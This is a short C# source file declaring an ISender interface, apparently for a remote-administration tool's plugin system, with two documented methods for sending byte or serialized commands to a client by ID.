using Orcus.Shared.Data;
using Orcus.Shared.Server;

namespace Orcus.Administration.Plugins.CommandViewPlugin
{
    /// <summary>
    ///     The connection to the client
    /// </summary>
    public interface ISender
    {
        /// <summary>
        ///     Send the client with the <see cref="id" /> the <see cref="bytes" />
        /// </summary>
        void SendCommand(int id, byte[] bytes, PackageCompression packageCompression = PackageCompression.Auto);

        /// <summary>
        ///     Send the client a command
        /// </summary>
        /// <param name="clientId">The Id of the client</param>
        /// <param name="commandId">The id of the command to send</param>
        /// <param name="writerCall">Write the parameter</param>
        void UnsafeSendCommand(int clientId, uint commandId, WriterCall writerCall);
    }
}